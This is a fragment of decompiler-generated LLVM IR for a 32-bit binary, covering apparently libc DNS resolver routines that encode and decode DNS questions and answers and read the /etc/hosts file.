  %v1_805769c = add i32 %v0_8057698, 7
  %v2_805769c = inttoptr i32 %v1_805769c to i8*
  %v3_805769c = load i8, i8* %v2_805769c, align 1
  %v4_805769c = zext i8 %v3_805769c to i32
  %v2_80576a0 = mul nuw nsw i32 %v4_8057698, 256
  %v2_80576a3 = or i32 %v4_805769c, %v2_80576a0
  %v1_80576a5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80576a5 = add i32 %v1_80576a5, 36
  %v3_80576a5 = inttoptr i32 %v2_80576a5 to i32*
  store i32 %v2_80576a3, i32* %v3_80576a5, align 4
  %v0_80576a8 = load i32, i32* @ecx, align 4
  %v1_80576a8 = add i32 %v0_80576a8, 8
  %v2_80576a8 = inttoptr i32 %v1_80576a8 to i8*
  %v3_80576a8 = load i8, i8* %v2_80576a8, align 1
  %v4_80576a8 = zext i8 %v3_80576a8 to i32
  %v1_80576ac = add i32 %v0_80576a8, 9
  %v2_80576ac = inttoptr i32 %v1_80576ac to i8*
  %v3_80576ac = load i8, i8* %v2_80576ac, align 1
  %v4_80576ac = zext i8 %v3_80576ac to i32
  %v2_80576b0 = mul nuw nsw i32 %v4_80576a8, 256
  %v2_80576b3 = or i32 %v4_80576ac, %v2_80576b0
  %v1_80576b5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80576b5 = add i32 %v1_80576b5, 40
  %v3_80576b5 = inttoptr i32 %v2_80576b5 to i32*
  store i32 %v2_80576b3, i32* %v3_80576b5, align 4
  %v0_80576b8 = load i32, i32* @ecx, align 4
  %v1_80576b8 = add i32 %v0_80576b8, 10
  %v2_80576b8 = inttoptr i32 %v1_80576b8 to i8*
  %v3_80576b8 = load i8, i8* %v2_80576b8, align 1
  %v4_80576b8 = zext i8 %v3_80576b8 to i32
  %v1_80576bc = add i32 %v0_80576b8, 11
  %v2_80576bc = inttoptr i32 %v1_80576bc to i8*
  %v3_80576bc = load i8, i8* %v2_80576bc, align 1
  %v4_80576bc = zext i8 %v3_80576bc to i32
  %v2_80576c0 = mul nuw nsw i32 %v4_80576b8, 256
  %v2_80576c3 = or i32 %v4_80576bc, %v2_80576c0
  %v1_80576c5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80576c5 = add i32 %v1_80576c5, 44
  %v3_80576c5 = inttoptr i32 %v2_80576c5 to i32*
  store i32 %v2_80576c3, i32* %v3_80576c5, align 4
  %v2_80576cd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80576cd, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 10, 11, 5, 6, 9, 14, 7, 2, 12, 13, 0, 8, 3, 1, 4 }
  uselistorder i32 7, { 12, 13, 3, 8, 4, 2, 9, 14, 15, 16, 17, 5, 0, 11, 6, 7, 10, 1 }
  uselistorder i32 6, { 25, 26, 2, 3, 27, 28, 0, 7, 19, 14, 15, 9, 31, 16, 29, 30, 4, 1, 5, 8, 13, 17, 18, 23, 10, 11, 12, 20, 21, 22, 24, 6 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 20, 5, 12, 25, 21, 6, 22, 7, 8, 9, 10, 23, 24, 11, 18, 13, 19, 14, 15, 17, 16 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i8 8, { 0, 2, 7, 3, 4, 1, 5, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80576d0 = load i32, i32* @edi, align 4
  %v0_80576d1 = load i32, i32* @esi, align 4
  %v0_80576d2 = load i32, i32* @ebx, align 4
  store i32 %v0_80576d2, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_80576df = load i32, i32* @eax, align 4
  %v1_80576e2 = inttoptr i32 %tmp3 to i32*
  %v2_80576e2 = load i32, i32* %v1_80576e2, align 4
  %v7_80576e4 = inttoptr i32 %v2_80576e2 to i8*
  %v8_80576e4 = call i32 @__encode_dotted(i8* %v7_80576e4, i32 %tmp2, i32 %tmp, i32 %v0_80576df, i32 %v0_80576d2, i32 %v0_80576d1, i32 %v0_80576d0)
  store i32 %v8_80576e4, i32* @ecx, align 4
  %v2_80576ee = icmp slt i32 %v8_80576e4, 0
  br i1 %v2_80576ee, label %dec_label_pc_805771d, label %dec_label_pc_80576f2

dec_label_pc_80576f2:                             ; preds = %entry
  %v0_80576f2 = load i32, i32* @ebx, align 4
  %v2_80576f2 = sub i32 %v0_80576f2, %v8_80576e4
  %v1_80576f4 = add i32 %v2_80576f2, -3
  %v6_80576f4 = sub i32 2, %v2_80576f2
  %v7_80576f4 = and i32 %v6_80576f4, %v2_80576f2
  %v8_80576f4 = icmp slt i32 %v7_80576f4, 0
  %v9_80576f4 = icmp eq i32 %v1_80576f4, 0
  %v10_80576f4 = icmp slt i32 %v1_80576f4, 0
  %v3_80576f7 = icmp eq i1 %v10_80576f4, %v8_80576f4
  %v4_80576f7 = icmp eq i1 %v9_80576f4, false
  %v5_80576f7 = and i1 %v4_80576f7, %v3_80576f7
  br i1 %v5_80576f7, label %dec_label_pc_80576fe, label %dec_label_pc_80576f9

dec_label_pc_80576f9:                             ; preds = %dec_label_pc_80576f2
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_805771d

dec_label_pc_80576fe:                             ; preds = %dec_label_pc_80576f2
  %v0_80576fe = load i32, i32* @edi, align 4
  %v2_80576fe = add i32 %v0_80576fe, %v8_80576e4
  store i32 %v2_80576fe, i32* @edx, align 4
  %v1_8057701 = add i32 %v8_80576e4, 4
  store i32 %v1_8057701, i32* @ecx, align 4
  %v0_8057704 = load i32, i32* @esi, align 4
  %v1_8057704 = add i32 %v0_8057704, 5
  %v2_8057704 = inttoptr i32 %v1_8057704 to i8*
  %v3_8057704 = load i8, i8* %v2_8057704, align 1
  %v3_8057708 = inttoptr i32 %v2_80576fe to i8*
  store i8 %v3_8057704, i8* %v3_8057708, align 1
  %v0_805770a = load i32, i32* @esi, align 4
  %v1_805770a = add i32 %v0_805770a, 4
  %v2_805770a = inttoptr i32 %v1_805770a to i32*
  %v3_805770a = load i32, i32* %v2_805770a, align 4
  %v1_805770d = trunc i32 %v3_805770a to i8
  %v2_805770d = load i32, i32* @edx, align 4
  %v3_805770d = add i32 %v2_805770d, 1
  %v4_805770d = inttoptr i32 %v3_805770d to i8*
  store i8 %v1_805770d, i8* %v4_805770d, align 1
  %v0_8057710 = load i32, i32* @esi, align 4
  %v1_8057710 = add i32 %v0_8057710, 9
  %v2_8057710 = inttoptr i32 %v1_8057710 to i8*
  %v3_8057710 = load i8, i8* %v2_8057710, align 1
  %v2_8057714 = load i32, i32* @edx, align 4
  %v3_8057714 = add i32 %v2_8057714, 2
  %v4_8057714 = inttoptr i32 %v3_8057714 to i8*
  store i8 %v3_8057710, i8* %v4_8057714, align 1
  %v0_8057717 = load i32, i32* @esi, align 4
  %v1_8057717 = add i32 %v0_8057717, 8
  %v2_8057717 = inttoptr i32 %v1_8057717 to i32*
  %v3_8057717 = load i32, i32* %v2_8057717, align 4
  %v1_805771a = trunc i32 %v3_8057717 to i8
  %v2_805771a = load i32, i32* @edx, align 4
  %v3_805771a = add i32 %v2_805771a, 3
  %v4_805771a = inttoptr i32 %v3_805771a to i8*
  store i8 %v1_805771a, i8* %v4_805771a, align 1
  %v0_805771d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805771d

dec_label_pc_805771d:                             ; preds = %entry, %dec_label_pc_80576f9, %dec_label_pc_80576fe
  %v0_805771d = phi i32 [ %v8_80576e4, %entry ], [ -1, %dec_label_pc_80576f9 ], [ %v0_805771d.pre, %dec_label_pc_80576fe ]
  %v2_805771f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805771f, i32* @ebx, align 4
  store i32 %v0_80576d0, i32* @edi, align 4
  ret i32 %v0_805771d

; uselistorder directives
  uselistorder i32 %v1_80576f4, { 1, 0 }
  uselistorder i32 %v2_80576f2, { 0, 2, 1 }
  uselistorder i32 %v8_80576e4, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 0, 5 }
  uselistorder label %dec_label_pc_805771d, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_805772f = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8057737 = icmp slt i32 %v2_805772f, 0
  br i1 %v2_8057737, label %dec_label_pc_805773e, label %dec_label_pc_805773b

dec_label_pc_805773b:                             ; preds = %entry
  %v1_805773b = add i32 %v2_805772f, 4
  br label %dec_label_pc_805773e

dec_label_pc_805773e:                             ; preds = %entry, %dec_label_pc_805773b
  %v0_8057741 = phi i32 [ %v2_805772f, %entry ], [ %v1_805773b, %dec_label_pc_805773b ]
  ret i32 %v0_8057741

; uselistorder directives
  uselistorder label %dec_label_pc_805773e, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057744 = load i32, i32* @ebp, align 4
  %v0_8057745 = load i32, i32* @edi, align 4
  %v0_8057746 = load i32, i32* @esi, align 4
  %v0_8057747 = load i32, i32* @ebx, align 4
  store i32 %v0_8057747, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8057768 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8057775 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8057768, i32 256)
  store i32 %v4_8057775, i32* @edi, align 4
  %v3_805777f = icmp slt i32 %v4_8057775, 0
  br i1 %v3_805777f, label %dec_label_pc_8057830, label %dec_label_pc_8057787

dec_label_pc_8057787:                             ; preds = %entry
  %v0_8057787 = load i32, i32* @ebx, align 4
  %v3_8057787 = add i32 %v0_8057787, %v4_8057775
  %v0_8057789 = load i32, i32* @esi, align 4
  %v2_8057789 = sub i32 %v0_8057789, %v3_8057787
  %v1_805778f = add i32 %v2_8057789, -10
  %v10_805778f = icmp slt i32 %v1_805778f, 0
  store i32 %v1_805778f, i32* @esi, align 4
  %v1_8057796 = icmp eq i1 %v10_805778f, false
  br i1 %v1_8057796, label %dec_label_pc_805779f, label %dec_label_pc_8057798

dec_label_pc_8057798:                             ; preds = %dec_label_pc_8057787
  br label %dec_label_pc_8057830

dec_label_pc_805779f:                             ; preds = %dec_label_pc_8057787
  %v6_80577a6 = add i32 %v3_8057787, %tmp4
  store i32 %v6_80577a6, i32* @ebx, align 4
  %v1_80577b2 = bitcast i32* %stack_var_-272 to i8*
  %v2_80577b2 = call i32 @__GI_strdup(i8* %v1_80577b2)
  %v1_80577b7 = load i32, i32* @ebp, align 4
  %v2_80577b7 = inttoptr i32 %v1_80577b7 to i32*
  store i32 %v2_80577b2, i32* %v2_80577b7, align 4
  %v0_80577ba = load i32, i32* @ebx, align 4
  %v1_80577ba = add i32 %v0_80577ba, 4
  store i32 %v1_80577ba, i32* %esi.global-to-local, align 4
  %v1_80577bd = inttoptr i32 %v0_80577ba to i8*
  %v2_80577bd = load i8, i8* %v1_80577bd, align 1
  %v3_80577bd = zext i8 %v2_80577bd to i32
  %v1_80577c0 = add i32 %v0_80577ba, 1
  %v2_80577c0 = inttoptr i32 %v1_80577c0 to i8*
  %v3_80577c0 = load i8, i8* %v2_80577c0, align 1
  %v4_80577c0 = zext i8 %v3_80577c0 to i32
  %v2_80577c4 = mul nuw nsw i32 %v3_80577bd, 256
  %v2_80577c7 = or i32 %v4_80577c0, %v2_80577c4
  %v1_80577c9 = load i32, i32* @ebp, align 4
  %v2_80577c9 = add i32 %v1_80577c9, 4
  %v3_80577c9 = inttoptr i32 %v2_80577c9 to i32*
  store i32 %v2_80577c7, i32* %v3_80577c9, align 4
  %v0_80577cc = load i32, i32* @ebx, align 4
  %v1_80577cc = add i32 %v0_80577cc, 2
  %v2_80577cc = inttoptr i32 %v1_80577cc to i8*
  %v3_80577cc = load i8, i8* %v2_80577cc, align 1
  %v4_80577cc = zext i8 %v3_80577cc to i32
  %v1_80577d0 = add i32 %v0_80577cc, 3
  %v2_80577d0 = inttoptr i32 %v1_80577d0 to i8*
  %v3_80577d0 = load i8, i8* %v2_80577d0, align 1
  %v4_80577d0 = zext i8 %v3_80577d0 to i32
  %v2_80577d4 = mul nuw nsw i32 %v4_80577cc, 256
  %v2_80577d7 = or i32 %v4_80577d0, %v2_80577d4
  %v1_80577d9 = load i32, i32* @ebp, align 4
  %v2_80577d9 = add i32 %v1_80577d9, 8
  %v3_80577d9 = inttoptr i32 %v2_80577d9 to i32*
  store i32 %v2_80577d7, i32* %v3_80577d9, align 4
  %v0_80577dc = load i32, i32* @ebx, align 4
  %v1_80577dc = add i32 %v0_80577dc, 4
  %v2_80577dc = inttoptr i32 %v1_80577dc to i8*
  %v3_80577dc = load i8, i8* %v2_80577dc, align 1
  %v4_80577dc = zext i8 %v3_80577dc to i32
  %v0_80577e0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80577e0 = add i32 %v0_80577e0, 1
  %v2_80577e0 = inttoptr i32 %v1_80577e0 to i8*
  %v3_80577e0 = load i8, i8* %v2_80577e0, align 1
  %v4_80577e0 = zext i8 %v3_80577e0 to i32
  %v2_80577e4 = mul nuw i32 %v4_80577dc, 16777216
  %v2_80577e7 = mul nuw nsw i32 %v4_80577e0, 65536
  %v1_80577ea = add i32 %v0_80577e0, 2
  %v2_80577ea = inttoptr i32 %v1_80577ea to i8*
  %v3_80577ea = load i8, i8* %v2_80577ea, align 1
  %v4_80577ea = zext i8 %v3_80577ea to i32
  %v2_80577ee = mul nuw nsw i32 %v4_80577ea, 256
  %v2_80577f1 = or i32 %v2_80577e7, %v2_80577e4
  %v1_80577f3 = add i32 %v0_80577e0, 3
  %v2_80577f3 = inttoptr i32 %v1_80577f3 to i8*
  %v3_80577f3 = load i8, i8* %v2_80577f3, align 1
  %v4_80577f3 = zext i8 %v3_80577f3 to i32
  %v2_80577f7 = or i32 %v4_80577f3, %v2_80577f1
  %v2_80577f9 = or i32 %v2_80577f7, %v2_80577ee
  store i32 %v2_80577f9, i32* @ecx, align 4
  %v1_80577fb = load i32, i32* @ebp, align 4
  %v2_80577fb = add i32 %v1_80577fb, 12
  %v3_80577fb = inttoptr i32 %v2_80577fb to i32*
  store i32 %v2_80577f9, i32* %v3_80577fb, align 4
  %v0_80577fe = load i32, i32* @ebx, align 4
  %v1_80577fe = add i32 %v0_80577fe, 8
  %v2_80577fe = inttoptr i32 %v1_80577fe to i8*
  %v3_80577fe = load i8, i8* %v2_80577fe, align 1
  %v4_80577fe = zext i8 %v3_80577fe to i32
  %v1_8057802 = add i32 %v0_80577fe, 9
  %v2_8057802 = inttoptr i32 %v1_8057802 to i8*
  %v3_8057802 = load i8, i8* %v2_8057802, align 1
  %v4_8057802 = zext i8 %v3_8057802 to i32
  %v2_8057806 = mul nuw nsw i32 %v4_80577fe, 256
  %v1_8057809 = add i32 %v0_80577fe, 10
  %v2_805780c = or i32 %v4_8057802, %v2_8057806
  store i32 %v2_805780c, i32* @edx, align 4
  %v1_805780e = load i32, i32* @ebp, align 4
  %v2_805780e = add i32 %v1_805780e, 20
  %v3_805780e = inttoptr i32 %v2_805780e to i32*
  store i32 %v1_8057809, i32* %v3_805780e, align 4
  %v0_8057811 = load i32, i32* @edx, align 4
  %v1_8057811 = load i32, i32* @ebp, align 4
  %v2_8057811 = add i32 %v1_8057811, 16
  %v3_8057811 = inttoptr i32 %v2_8057811 to i32*
  store i32 %v0_8057811, i32* %v3_8057811, align 4
  %v1_805781b = add i32 %v3_8057787, 10
  %v1_805781e = load i32, i32* @ebp, align 4
  %v2_805781e = add i32 %v1_805781e, 24
  %v3_805781e = inttoptr i32 %v2_805781e to i32*
  store i32 %v1_805781b, i32* %v3_805781e, align 4
  %v4_8057821 = load i32, i32* @edx, align 4
  %v5_8057825 = icmp slt i32 %v1_805778f, %v4_8057821
  br i1 %v5_8057825, label %dec_label_pc_8057827, label %dec_label_pc_805782c

dec_label_pc_8057827:                             ; preds = %dec_label_pc_805779f
  br label %dec_label_pc_8057830

dec_label_pc_805782c:                             ; preds = %dec_label_pc_805779f
  %v1_805782c = load i32, i32* @edi, align 4
  %v2_805782c = add i32 %v4_8057821, 10
  %v3_805782c = add i32 %v2_805782c, %v1_805782c
  br label %dec_label_pc_8057830

dec_label_pc_8057830:                             ; preds = %entry, %dec_label_pc_8057827, %dec_label_pc_8057798, %dec_label_pc_805782c
  %v0_8057836 = phi i32 [ %v4_8057775, %entry ], [ -1, %dec_label_pc_8057827 ], [ %v1_805778f, %dec_label_pc_8057798 ], [ %v3_805782c, %dec_label_pc_805782c ]
  %v2_8057838 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057838, i32* @ebx, align 4
  store i32 %v0_8057746, i32* @esi, align 4
  store i32 %v0_8057745, i32* @edi, align 4
  store i32 %v0_8057744, i32* @ebp, align 4
  ret i32 %v0_8057836

; uselistorder directives
  uselistorder i32 %v1_805778f, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8057787, { 1, 0, 2 }
  uselistorder i32 %v4_8057775, { 1, 0, 2, 3 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 61, 62, 63, 64, 65, 66, 26, 3, 27, 16, 67, 7, 68, 28, 9, 8, 4, 1, 2, 0, 29, 5, 30, 50, 17, 51, 38, 39, 40, 41, 42, 43, 69, 18, 19, 44, 31, 15, 11, 12, 10, 13, 33, 54, 34, 55, 35, 56, 36, 57, 37, 58, 45, 32, 46, 59, 60, 20, 47, 21, 48, 49, 52, 53, 14, 22, 23, 24, 25, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8057830, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_805784d = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805c965.600 to i32), i32 ptrtoint (i32* @global_var_805c930.585 to i32))
  store i32 %v3_805784d, i32* @eax, align 4
  %v1_8057855 = icmp eq i32 %v3_805784d, 0
  %v1_8057857 = icmp eq i1 %v1_8057855, false
  br i1 %v1_8057857, label %dec_label_pc_805786d, label %dec_label_pc_8057859

dec_label_pc_8057859:                             ; preds = %entry
  %v3_8057865 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805c970.601 to i32), i32 ptrtoint (i32* @global_var_805c930.585 to i32))
  br label %dec_label_pc_805786d

dec_label_pc_805786d:                             ; preds = %entry, %dec_label_pc_8057859
  %v0_8057870 = phi i32 [ %v3_805784d, %entry ], [ %v3_8057865, %dec_label_pc_8057859 ]
  ret i32 %v0_8057870

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805c930.585 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_805786d, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8057871 = load i32, i32* @ebp, align 4
  %v0_8057872 = load i32, i32* @edi, align 4
  %v0_8057873 = load i32, i32* @esi, align 4
  %v0_8057874 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8057882 = sub i32 0, %arg6
  %v1_8057884 = urem i32 %v1_8057882, 4
  %v2_8057884 = icmp eq i32 %v1_8057884, 0
  store i32 %v1_8057884, i32* %eax.global-to-local, align 4
  br i1 %v2_8057884, label %dec_label_pc_8057895, label %dec_label_pc_8057889

dec_label_pc_8057889:                             ; preds = %entry
  %v2_8057889 = sub i32 %arg7, %v1_8057884
  %v7_8057889 = icmp ugt i32 %v1_8057884, %arg7
  br i1 %v7_8057889, label %dec_label_pc_8057b39, label %dec_label_pc_8057891

dec_label_pc_8057891:                             ; preds = %dec_label_pc_8057889
  %v2_8057891 = add i32 %v1_8057884, %arg6
  store i32 %v2_8057891, i32* @ebx, align 4
  store i32 %v2_8057889, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057895

dec_label_pc_8057895:                             ; preds = %entry, %dec_label_pc_8057891
  %v0_805789e = phi i32 [ %arg6, %entry ], [ %v2_8057891, %dec_label_pc_8057891 ]
  %v0_80578a1 = phi i32 [ %arg7, %entry ], [ %v2_8057889, %dec_label_pc_8057891 ]
  %tmp149 = icmp ult i32 %v0_80578a1, 32
  br i1 %tmp149, label %dec_label_pc_8057b39, label %dec_label_pc_805789e

dec_label_pc_805789e:                             ; preds = %dec_label_pc_8057895
  %v1_805789e = add i32 %v0_805789e, 32
  store i32 %v1_805789e, i32* %eax.global-to-local, align 4
  %v1_80578a1 = add i32 %v0_80578a1, -32
  store i32 %v1_80578a1, i32* @ebp, align 4
  %v5_80578a4 = inttoptr i32 %v1_805789e to i8*
  %v12_80578a8 = icmp eq i32 %arg4, 1
  br i1 %v12_80578a8, label %dec_label_pc_80579ca, label %dec_label_pc_80578b3

dec_label_pc_80578b3:                             ; preds = %dec_label_pc_805789e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_80578ba = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80578ba, align 4
  %tmp150 = icmp ult i32 %v1_80578a1, 4
  br i1 %tmp150, label %dec_label_pc_8057b39, label %dec_label_pc_80578c6

dec_label_pc_80578c6:                             ; preds = %dec_label_pc_80578b3
  %v0_80578c6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80578c6 = add i32 %v0_80578c6, -36
  store i32 %v1_80578c6, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_80578c6, 8
  br i1 %tmp151, label %dec_label_pc_8057b39, label %dec_label_pc_80578d2

dec_label_pc_80578d2:                             ; preds = %dec_label_pc_80578c6
  %v0_80578d2 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_80578d2, 16
  br i1 %tmp152, label %dec_label_pc_8057b39, label %dec_label_pc_80578db

dec_label_pc_80578db:                             ; preds = %dec_label_pc_80578d2
  %v1_80578db = add i32 %v0_80578c6, -48
  store i32 %v1_80578db, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_80578db, 8
  br i1 %tmp153, label %dec_label_pc_8057b39, label %dec_label_pc_80578e7

dec_label_pc_80578e7:                             ; preds = %dec_label_pc_80578db
  %v0_80578e7 = load i32, i32* @ebx, align 4
  %v1_80578e7 = add i32 %v0_80578e7, 48
  %v1_80578ea = add i32 %v0_80578c6, -44
  store i32 %v1_80578ea, i32* @ebp, align 4
  %v1_80578f1 = add i32 %v0_80578c6, -56
  store i32 %v1_80578f1, i32* @eax, align 4
  %v1_80578f4 = add i32 %v0_80578e7, 36
  store i32 %v1_80578f4, i32* @edi, align 4
  %v7_80578f7 = icmp ult i32 %v1_80578f1, %v1_80578ea
  br i1 %v7_80578f7, label %dec_label_pc_8057900, label %dec_label_pc_80578fb

dec_label_pc_80578fb:                             ; preds = %dec_label_pc_80578e7
  %v1_80578fb = add i32 %v0_80578e7, 44
  store i32 %v1_80578fb, i32* @esi, align 4
  br label %dec_label_pc_8057905

dec_label_pc_8057900:                             ; preds = %dec_label_pc_80578e7
  %v1_8057900 = add i32 %v0_80578e7, 56
  store i32 %v1_8057900, i32* @esi, align 4
  store i32 %v1_80578f1, i32* @ebp, align 4
  br label %dec_label_pc_8057905

dec_label_pc_8057905:                             ; preds = %dec_label_pc_80578fb, %dec_label_pc_8057900
  %v0_8057905 = phi i32 [ %v1_80578ea, %dec_label_pc_80578fb ], [ %v1_80578f1, %dec_label_pc_8057900 ]
  %tmp154 = icmp ult i32 %v0_8057905, 80
  br i1 %tmp154, label %dec_label_pc_8057b39, label %dec_label_pc_805790e

dec_label_pc_805790e:                             ; preds = %dec_label_pc_8057905
  %v0_805790e = call i32 @__open_etc_hosts()
  store i32 %v0_805790e, i32* %eax.global-to-local, align 4
  %v1_8057917 = icmp eq i32 %v0_805790e, 0
  br i1 %v1_8057917, label %dec_label_pc_805793b, label %dec_label_pc_805791b

dec_label_pc_805791b:                             ; preds = %dec_label_pc_805790e
  store i32 %v1_805789e, i32* %edx.global-to-local, align 4
  store i32 %v1_80578e7, i32* %eax.global-to-local, align 4
  store i8* %v5_80578a4, i8** %stack_var_-44, align 4
  %v0_8057926 = load i32, i32* @edi, align 4
  %v0_8057932 = load i32, i32* @esi, align 4
  %v5_8057932 = inttoptr i32 %v0_8057932 to i8*
  br label %dec_label_pc_80579e9

dec_label_pc_805793b:                             ; preds = %dec_label_pc_805790e
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805793f = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805793f, align 4
  %v1_8057945 = call i32 @__errno_location(i32 0)
  store i32 %v1_8057945, i32* %eax.global-to-local, align 4
  %v1_805794a = inttoptr i32 %v1_8057945 to i32*
  %v2_805794a = load i32, i32* %v1_805794a, align 4
  store i32 %v2_805794a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057b39

dec_label_pc_8057955:                             ; preds = %dec_label_pc_8057abc
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8057959 = load i8*, i8** %stack_var_-44, align 4
  %v3_8057959 = ptrtoint i8* %v2_8057959 to i32
  %v2_805795c = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8057959, i32* %v2_805795c, align 4
  %v0_805795e = load i32, i32* %eax.global-to-local, align 4
  %v1_805795e = add i32 %v0_805795e, 4
  %v2_805795e = inttoptr i32 %v1_805795e to i32*
  store i32 0, i32* %v2_805795e, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8057969 = load i32, i32* @ebx, align 4
  %v1_8057969 = add i32 %v0_8057969, 4
  %v2_8057969 = inttoptr i32 %v1_8057969 to i32*
  %v3_8057969 = load i32, i32* %v2_8057969, align 4
  store i32 %v3_8057969, i32* %eax.global-to-local, align 4
  store i32 %v3_8057969, i32* %arg5, align 4
  %v0_805796e = load i32, i32* %edx.global-to-local, align 4
  %v1_805796e = add i32 %v0_805796e, 8
  %v2_805796e = inttoptr i32 %v1_805796e to i32*
  store i32 2, i32* %v2_805796e, align 4
  %v0_8057975 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057975 = add i32 %v0_8057975, 12
  %v2_8057975 = inttoptr i32 %v1_8057975 to i32*
  store i32 4, i32* %v2_8057975, align 4
  br label %dec_label_pc_80579ae

dec_label_pc_8057982:                             ; preds = %dec_label_pc_8057ade
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_805798a = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_805798a, align 4
  %v0_805798c = load i32, i32* %edx.global-to-local, align 4
  %v1_805798c = add i32 %v0_805798c, 4
  %v2_805798c = inttoptr i32 %v1_805798c to i32*
  store i32 0, i32* %v2_805798c, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8057997 = load i32, i32* @ebx, align 4
  %v1_8057997 = add i32 %v0_8057997, 4
  %v2_8057997 = inttoptr i32 %v1_8057997 to i32*
  %v3_8057997 = load i32, i32* %v2_8057997, align 4
  store i32 %v3_8057997, i32* %eax.global-to-local, align 4
  store i32 %v3_8057997, i32* %arg5, align 4
  %v0_805799c = load i32, i32* %edx.global-to-local, align 4
  %v1_805799c = add i32 %v0_805799c, 8
  %v2_805799c = inttoptr i32 %v1_805799c to i32*
  store i32 10, i32* %v2_805799c, align 4
  %v0_80579a3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80579a3 = add i32 %v0_80579a3, 12
  %v2_80579a3 = inttoptr i32 %v1_80579a3 to i32*
  store i32 16, i32* %v2_80579a3, align 4
  br label %dec_label_pc_80579ae

dec_label_pc_80579ae:                             ; preds = %dec_label_pc_8057955, %dec_label_pc_8057982
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8057955 ], [ %stack_var_-32.0, %dec_label_pc_8057982 ]
  %v1_80579ae = load i32, i32* %edx.global-to-local, align 4
  %v2_80579ae = add i32 %v1_80579ae, 16
  %v3_80579ae = inttoptr i32 %v2_80579ae to i32*
  store i32 %storemerge, i32* %v3_80579ae, align 4
  %v0_80579b1 = load i32, i32* @ebx, align 4
  %v1_80579b1 = add i32 %v0_80579b1, 8
  %v1_80579b4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80579b4 = add i32 %v1_80579b4, 4
  %v3_80579b4 = inttoptr i32 %v2_80579b4 to i32*
  store i32 %v1_80579b1, i32* %v3_80579b4, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80579bb = load i32, i32* %edx.global-to-local, align 4
